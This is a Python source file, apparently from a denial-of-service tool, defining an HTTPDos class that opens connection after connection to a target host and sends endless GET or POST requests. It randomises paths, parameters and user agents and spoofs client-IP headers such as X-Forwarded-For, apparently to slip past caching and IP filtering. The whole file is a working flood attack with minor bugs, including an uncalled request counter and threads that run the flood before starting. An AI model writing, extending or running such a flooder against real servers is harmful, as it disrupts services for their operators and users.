import socket
import ssl
import random
import json
import os
import sys
import itertools
import string
import time
from threading import Thread
from src.utils import color_text
from src.config import TCP


class HTTPDos():

    def __init__(self, target_ip, target_port, protocol, http_method=None, udp_size_bytes=1024, thread_number=4):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.http_method = http_method
        self.udp_size_bytes = udp_size_bytes
        self.thread_number = thread_number
        self.ssl_available = False
        self.counter = itertools.count(1)

    def http_flood(self):
        """
        HTTP(S) flood
        """
        if self.http_method == 'GET':
            request_func = self.get_http_request
        elif self.http_method == 'POST':
            request_func = self.post_http_request
        else:
            sys.exit(color_text(
                'red', '[!] Error : HTTP method only GET or POST'))

        color_text('green', '[+] Connect to send request ...')
        time.sleep(1)
        color_text('yellow', '[+] Start sending')

        if self.protocol == 'https':
            self.ssl_available = self.test_ssl_connection()

        if self.protocol == 'https' and self.ssl_available:

            # Create ssl certificat
            context = ssl.create_default_context()
            while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                ssl_sock = context.wrap_socket(
                    sock, server_hostname=self.target_ip)

                # connection
                ssl_sock.connect((self.target_ip, self.target_port))
                ssl_sock.send(request_func())
                ssl_sock.close()

                self.count_requests
        else:
            if self.protocol == 'https':  # if https failure, testing http
                color_text(
                    'blue', f'[*] {self.target_ip} on port {self.target_port} is available sending request !')
            while True:
                sock = socket.socket(socket.AF_INET, TCP)
                sock.connect((self.target_ip, self.target_port))
                # call var with () at the end to call function
                sock.send(request_func())
                sock.close()

                self.count_requests

    def test_ssl_connection(self):
        """Fonction pour tester si SSL est disponible sur le serveur"""
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            ssl_sock = context.wrap_socket(
                sock, server_hostname=self.target_ip)

            # connection
            ssl_sock.connect((self.target_ip, self.target_port))
            ssl_sock.send(self.get_http_request())
            ssl_sock.close()

            return True  # SSL valid
        except:
            color_text(
                'red', "\r\n[!] HTTPS isn't available, test with http !\r\n")
            self.attack = 'http'  # if https is not valide, test on http port 80 by default

            return False

    def count_requests(self):

        request_nb = next(self.counter)

        if request_nb % 10_000 == 0:
            sys.stdout.write(f'{request_nb} request send !\r\n')
            sys.stdout.flush()

    def get_http_request(self):
        random_ip = self.http_random_ip()

        header = f"GET /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
        header += f"Host: {self.target_ip}\r\n"
        header += f"Accept: */*\r\n"
        header += f"Accept-Encoding: gzip,deflate\r\n"
        header += f"User-Agent: {self.http_random_agent()}\r\n"
        header += f"X-Originating-IP: {random_ip}\r\n"
        header += f"X-Forwarded-For: {random_ip}\r\n"
        header += f"X-Remote-IP: {random_ip}\r\n"
        header += f"X-Remote-Addr: {random_ip}\r\n"
        header += f"X-Client-IP: {random_ip}\r\n"
        header += 'Accept-Language: en-US,en;q=0.9\r\n'
        header += 'Connection: keep-alive\r\n'
        header += 'Pragma: no-cache\r\n'
        header += 'Cache-Control: no-cache\r\n'
        header += '\r\n\r\n'
        return header.encode()

    def post_http_request(self):
        random_ip = self.http_random_ip()
        body_content = f"{self.http_random_param()}&{self.http_random_param()}"

        header = f"POST /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
        header += f"Host: {self.target_ip}\r\n"
        header += f"Accept: */*\r\n"
        header += f"Accept-Encoding: gzip,deflate\r\n"
        header += f"User-Agent: {self.http_random_agent()}\r\n"
        header += f"X-Originating-IP: {random_ip}\r\n"
        header += f"X-Forwarded-For: {random_ip}\r\n"
        header += f"X-Remote-IP: {random_ip}\r\n"
        header += f"X-Remote-Addr: {random_ip}\r\n"
        header += f"X-Client-IP: {random_ip}\r\n"
        header += 'Accept-Language: en-US,en;q=0.9\r\n'
        header += 'Connection: keep-alive\r\n'
        header += 'Pragma: no-cache\r\n'
        header += 'Cache-Control: no-cache\r\n'
        header += f'Content-Length: {len(body_content)}'
        header += '\r\n\r\n'
        body = body_content

        return (header + body + '\r\n\r\n').encode()

    def http_random_agent(self):
        """Select a random agent from the list"""
        path = os.path.join('src', 'random-agent.json')
        with open(path, 'r') as f:
            data = json.load(f)
        return data[random.randint(0, len(data)-1)]['useragent']

    def http_random_param(self):
        """Generate a random GET parameter and value"""
        param = ''.join(random.choices(
            string.ascii_lowercase, k=random.randint(2, 10)))
        value = ''.join(random.choices(
            string.ascii_lowercase, k=random.randint(2, 10)))
        return f"{param}={value}"

    def http_random_ip(self):
        """Generate a random ip"""
        return ".".join(str(random.randint(15, 220)) for _ in range(4))

    def http_random_resource(self):
        """Generate random resource"""
        return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))

    def start_attack(self):
        """
        Manage threads and choose attack method
        """
        threads = []
        try:
            if self.protocol != False and self.protocol != '':
                if self.protocol == 'http' or self.protocol == 'https':
                    for _ in range(self.thread_number):
                        thread = Thread(target=self.http_flood())
                        threads.append(thread)
                        thread.start()
            else:
                print('Bad method')
                return

        except Exception as e:
            color_text('red', f'[!] Error: {e}')
